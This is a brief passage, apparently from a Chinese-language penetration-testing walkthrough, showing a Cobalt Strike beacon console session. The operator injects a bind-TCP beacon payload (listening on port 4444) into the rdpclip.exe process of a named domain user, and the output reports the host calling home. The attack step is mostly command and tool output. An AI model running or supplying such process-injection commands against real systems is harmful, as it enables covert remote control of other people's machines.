...
inject到ZPS\jean.wise的rdpclip.exe
...
点击以后
```
beacon> inject 2184 x64 tcp
[*] Tasked beacon to inject windows/beacon_bind_tcp (0.0.0.0:4444) into 2184 (x64)
[+] host called home, sent: 259632 bytes
